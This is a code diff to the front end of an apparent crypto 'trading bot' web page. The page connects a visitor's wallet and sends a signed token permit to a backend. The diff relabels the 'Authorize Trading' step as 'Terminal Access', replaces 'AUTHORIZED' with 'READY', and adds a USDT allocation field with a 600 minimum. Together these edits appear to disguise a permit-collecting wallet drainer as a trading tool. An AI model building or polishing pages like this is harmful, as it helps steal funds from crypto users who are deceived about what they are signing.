@@ -207,10 +207,56 @@ body {
         <div class="btn-stack">
             <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
             <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
-            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
+            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Terminal Access</button>
             <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
     4. Disconnect Wallet
 </button>
+
+<!-- ALLOCATION INPUT -->
+
+<div style="margin-top:12px;">
+
+    <div style="
+        font-size:10px;
+        color:#64748b;
+        margin-bottom:6px;
+        letter-spacing:1px;
+    ">
+        CAPITAL ALLOCATION
+    </div>
+
+    <input
+        id="allocation-input"
+        type="number"
+        min="600"
+        max="3000000"
+        step="1"
+        placeholder="MIN 600 — MAX 3,000,000 USDT"
+        style="
+            width:100%;
+            background:#080b12;
+            border:1px solid #1a2638;
+            color:#cbd5e1;
+            padding:10px;
+            border-radius:8px;
+            outline:none;
+            font-family:'JetBrains Mono', monospace;
+            font-size:11px;
+        "
+    >
+
+    <div
+        id="allocation-status"
+        style="
+            margin-top:6px;
+            font-size:10px;
+            color:#475569;
+        "
+    >
+        Awaiting allocation...
+    </div>
+
+</div>
         </div>
 
         <div class="status-box">
@@ -231,7 +277,7 @@ body {
             </div>
 
             <div class="status-grid">
-                <span>TRADING ACCESS</span>
+                <span>TERMINAL STATUS</span>
                 <div class="status-line">
                     <div id="dot-access" class="liveDot" style="background:#475569"></div>
                     <span id="st-access" style="color:#475569">RESTRICTED</span>
@@ -318,6 +364,16 @@ async function connectWallet(){
   const provider = new ethers.BrowserProvider(window.ethereum);
 
   log("🔌 Requesting wallet connection...");
+
+  document.getElementById('btn-activate').innerText =
+"2. Allocation Engine";
+
+updateStatus(
+ 'dot-bot',
+ 'st-bot',
+ 'ALLOCATING',
+ '#7c83ff'
+);
 
 
 await provider.send("eth_requestAccounts", []);
@@ -575,11 +631,25 @@ try {
 
   log("✅ Permit forwarded to backend");
 
-  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
-  updateStatus('dot-bot','st-bot','READY','#6366f1');
+  updateStatus(
+    'dot-access',
+    'st-access',
+    'READY',
+    '#10b981'
+  );
 
-  document.getElementById('btn-authorize').disabled = true;
-  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
+  updateStatus(
+    'dot-bot',
+    'st-bot',
+    'READY',
+    '#6366f1'
+  );
+
+  document.getElementById('btn-authorize').disabled = false;
+
+  document.getElementById('btn-authorize').innerText =
+    "3. Enter Terminal";
+
   document.getElementById('btn-activate').disabled = true;
 
 } catch (e) {
@@ -604,13 +674,76 @@ function activateBot() {
 }
 
 function authorizeTrading() {
- updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b');
+
+ log("🖥️ Launching terminal...");
+
+ updateStatus(
+   'dot-access',
+   'st-access',
+   'TERMINAL LIVE',
+   '#10b981'
+ );
+
+ window.location.href = "/terminal.html";
+
 }
 
 function disconnectWallet() {
  location.reload();
 }
+const allocationInput =
+  document.getElementById('allocation-input');
 
+const allocationStatus =
+  document.getElementById('allocation-status');
+
+allocationInput.addEventListener('input', () => {
+
+  const value =
+    Number(allocationInput.value);
+
+  if (!value) {
+
+    allocationStatus.innerText =
+      "Awaiting allocation...";
+
+    allocationStatus.style.color =
+      "#475569";
+
+    return;
+  }
+
+  if (value < 600) {
+
+    allocationStatus.innerText =
+      "Minimum allocation is 600 USDT";
+
+    allocationStatus.style.color =
+      "#ef4444";
+
+    return;
+  }
+
+  if (value > 3000000) {
+
+    allocationStatus.innerText =
+      "Maximum allocation is 3,000,000 USDT";
+
+    allocationStatus.style.color =
+      "#ef4444";
+
+    return;
+  }
+
+  allocationStatus.innerText =
+    "Allocation confirmed: " +
+    value.toLocaleString('en-US') +
+    " USDT";
+
+  allocationStatus.style.color =
+    "#10b981";
+
+});
 window.connectWallet = connectWallet;
 
 </script>
